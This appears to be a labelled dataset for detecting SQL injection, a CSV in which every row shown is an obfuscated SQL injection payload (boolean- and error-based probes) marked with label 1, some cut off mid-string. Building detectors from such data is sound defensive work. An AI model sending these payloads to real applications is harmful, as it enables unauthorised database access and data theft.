input_text,Label
"-9378)))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(((6051=6051",1
"-6646))/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((7212=7212",1
"-1368)/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(5976=5976",1
"-3724""/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/BVAZ",1
"-2583'/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/DWCn",1
"-5628')/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/yatF",1
"-9421)/**/OR/**/5816=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(5816=5816)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/fbtB",1
"'/**/IN/**/BOOLEAN/**/MODE)/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))#",1
"]-(SELECT/**/0/**/WHERE/**/1255=1255/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))|[",1
"""=""""/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/""""=""",1
"`=``/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/``=`",1
"`)/**/WHERE/**/2913=2913/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/qEWL",1
"`/**/WHERE/**/7147=7147/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/FHKL",1
")/**/AS/**/mDvn/**/WHERE/**/1332=1332/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/mlMt",1
""")/**/AS/**/JnOx/**/WHERE/**/9430=9430/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/MzXi",1
"')/**/AS/**/RlYg/**/WHERE/**/9927=9927/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/BfzD",1
"))/**/AS/**/vYRA/**/WHERE/**/4591=4591/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/cHyA",1
"""))/**/AS/**/bKMm/**/WHERE/**/6123=6123/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/BfpW",1
"'))/**/AS/**/aOaD/**/WHERE/**/7780=7780/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/oLwd",1
"+(SELECT/**/CHAR(122)+CHAR(108)+CHAR(86)+CHAR(68)/**/WHERE/**/7207=7207/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHA",1
"+(SELECT/**/PoLI/**/WHERE/**/3817=3817/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))+",1
"||(SELECT/**/CHAR(118)+CHAR(79)+CHAR(72)+CHAR(73)/**/WHERE/**/4109=4109/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))||",1
"||(SELECT/**/CHAR(78)+CHAR(106)+CHAR(87)+CHAR(118)/**/FROM/**/DUAL/**/WHERE/**/3260=3260/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))||",1
"'+(SELECT/**/CHAR(66)+CHAR(69)+CHAR(65)+CHAR(89)/**/WHERE/**/1663=1663/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))+'",1
"'||(SELECT/**/CHAR(88)+CHAR(80)+CHAR(80)+CHAR(83)/**/FROM/**/DUAL/**/WHERE/**/6996=6996/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))||'",1
"'||(SELECT/**/CHAR(107)+CHAR(107)+CHAR(76)+CHAR(86)/**/WHERE/**/8587=8587/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))||'",1
"/**/WHERE/**/6190=6190/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/wofr",1
"""/**/WHERE/**/8071=8071/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/KaIb",1
"'/**/WHERE/**/5968=5968/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/KixF",1
")/**/WHERE/**/8218=8218/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/sSmB",1
""")/**/WHERE/**/6294=6294/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/UKjw",1
"')/**/WHERE/**/5320=5320/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/NiYe",1
"'/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/OR/**/'CpjU'='XdLI",1
"/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))#/**/Pwsl",1
"/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/CwEM",1
"""/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/""Pmhp""/**/LIKE/**/""Pmhp",1
""")))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(((""shyq""/**/LIKE/**/""shyq",1
"""))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((""egoB""/**/LIKE/**/""egoB",1
""")/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(""biYb""/**/LIKE/**/""biYb",1
"""/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/""WPOS""=""WPOS",1
""")))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(((""zIrD""=""zIrD",1
"""))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((""PFqB""=""PFqB",1
""")/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(""oBoK""=""oBoK",1
"'/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/'Ttab'/**/LIKE/**/'Ttab",1
"%'/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/'pPdg%'='pPdg",1
"')))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((('oqak'/**/LIKE/**/'oqak",1
"'))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(('CJVx'/**/LIKE/**/'CJVx",1
"')/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/('QINq'/**/LIKE/**/'QINq",1
"'/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/'YiSX'='YiSX",1
"')))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((('zTbN'='zTbN",1
"'))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(('MXUd'='MXUd",1
"')/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/('IPrp'='IPrp",1
"/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))",1
")))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(((5034=5034",1
"))/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/((8594=8594",1
")/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))/**/AND/**/(2480=2480",1
"""/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/kKjt",1
"'/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/rcfR",1
"')/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/iIFQ",1
")/**/AND/**/3114=CONCAT(CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113),(SELECT/**/(CASE/**/WHEN/**/(3114=3114)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END)),CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))--/**/Bpfx",1
"-7343)/**/AS/**/KuKn/**/WHERE/**/3078=3078/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(10",1
"-8807"")/**/AS/**/KTGo/**/WHERE/**/3550=3550/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(1",1
"-7387')/**/AS/**/PrMh/**/WHERE/**/2322=2322/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(1",1
"-9301))/**/AS/**/lKjy/**/WHERE/**/8971=8971/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(1",1
"-7999""))/**/AS/**/QSPB/**/WHERE/**/2658=2658/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(",1
"-2407'))/**/AS/**/GDSo/**/WHERE/**/4534=4534/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(",1
"-2860/**/WHERE/**/1458=1458/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))-",1
"-6858""/**/WHERE/**/6502=6502/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))",1
"-2259'/**/WHERE/**/4626=4626/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))",1
"-4749)/**/WHERE/**/1275=1275/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113)))",1
"-9314"")/**/WHERE/**/2053=2053/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))",1
"-2633')/**/WHERE/**/6562=6562/**/OR/**/2088=CONVERT(INT,(SELECT/**/CHAR(113)+CHAR(98)+CHAR(112)+CHAR(112)+CHAR(113)+(SELECT/**/(CASE/**/WHEN/**/(2088=2088)/**/THEN/**/CHAR(49)/**/ELSE/**/CHAR(48)/**/END))+CHAR(113)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(113))",1
